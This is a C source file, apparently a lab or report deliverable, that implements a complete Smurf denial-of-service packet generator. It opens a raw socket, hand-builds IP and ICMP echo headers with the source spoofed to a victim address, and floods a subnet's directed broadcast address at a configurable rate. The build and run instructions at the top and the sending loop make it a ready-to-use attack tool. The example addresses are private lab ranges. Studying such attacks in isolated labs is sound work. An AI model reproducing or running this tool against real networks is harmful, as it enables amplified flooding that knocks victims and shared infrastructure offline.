/* smurf.c — hand-rolled Smurf-attack packet generator (report deliverable).
 *
 * Same design as smurf.py: a raw SOCK_RAW/IPPROTO_RAW socket with IP_HDRINCL,
 * an IP + ICMP-echo packet whose source is the spoofed VICTIM and whose
 * destination is a subnet DIRECTED BROADCAST, sent in a rate-controlled loop.
 * Every header field and BOTH checksums are computed here by hand.
 *
 * Build:  gcc -O2 -Wall -o smurf smurf.c
 * Run  :  ip netns exec attacker ./smurf <victim_ip> <broadcast_ip> \
 *                                        [rate_pps] [count] [payload_bytes]
 * e.g.:   ip netns exec attacker ./smurf 10.0.20.100 10.0.10.255 50 100 0
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

/* 16-bit one's-complement Internet checksum (RFC 1071). */
static unsigned short checksum(const void *buf, int len)
{
    const unsigned char *p = buf;
    unsigned long sum = 0;
    while (len > 1) {
        sum += (unsigned long)((p[0] << 8) | p[1]);  /* big-endian 16-bit word */
        p += 2;
        len -= 2;
    }
    if (len == 1)
        sum += (unsigned long)(p[0] << 8);           /* pad final odd byte */
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr,
            "usage: %s <victim_ip> <broadcast_ip> [rate_pps] [count] [payload_bytes]\n",
            argv[0]);
        return 1;
    }
    const char *victim = argv[1];
    const char *bcast  = argv[2];
    int  rate    = (argc > 3) ? atoi(argv[3]) : 50;
    long count   = (argc > 4) ? atol(argv[4]) : 100;
    int  payload = (argc > 5) ? atoi(argv[5]) : 0;
    if (rate <= 0)    rate = 50;
    if (payload < 0)  payload = 0;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) { perror("socket (need root)"); return 1; }
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    setsockopt(s, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));

    int  icmp_len = (int)sizeof(struct icmphdr) + payload;
    int  tot      = (int)sizeof(struct iphdr) + icmp_len;
    unsigned char *pkt = calloc(1, tot);
    if (!pkt) { perror("calloc"); return 1; }

    struct iphdr   *ip = (struct iphdr *)pkt;
    struct icmphdr *ic = (struct icmphdr *)(pkt + sizeof(struct iphdr));
    unsigned char  *data = pkt + sizeof(struct iphdr) + sizeof(struct icmphdr);
    for (int i = 0; i < payload; i++)
        data[i] = (unsigned char)(0x41 + (i % 26));

    ip->version  = 4;
    ip->ihl      = 5;
    ip->tos      = 0;
    ip->tot_len  = htons(tot);
    ip->id       = htons(0x1234);
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_ICMP;
    ip->check    = 0;
    if (inet_pton(AF_INET, victim, &ip->saddr) != 1) { fprintf(stderr, "bad victim ip\n"); return 1; }
    if (inet_pton(AF_INET, bcast,  &ip->daddr) != 1) { fprintf(stderr, "bad broadcast ip\n"); return 1; }
    ip->check = htons(checksum(ip, sizeof(struct iphdr)));

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = ip->daddr;

    struct timespec ts = { .tv_sec = 0, .tv_nsec = 1000000000L / rate };
    long sent = 0;
    printf("smurf.c: src=%s (spoofed) -> dst=%s  count=%ld rate=%dpps payload=%dB\n",
           victim, bcast, count, rate, payload);
    for (long n = 0; n < count; n++) {
        ic->type          = ICMP_ECHO;   /* type 8 */
        ic->code          = 0;
        ic->checksum      = 0;
        ic->un.echo.id    = htons((unsigned short)(getpid() & 0xffff));
        ic->un.echo.sequence = htons((unsigned short)n);
        ic->checksum      = htons(checksum(ic, icmp_len));
        if (sendto(s, pkt, tot, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
            perror("sendto");
        else
            sent++;
        nanosleep(&ts, NULL);
    }
    printf("smurf.c: sent %ld spoofed echo requests\n", sent);

    free(pkt);
    close(s);
    return 0;
}
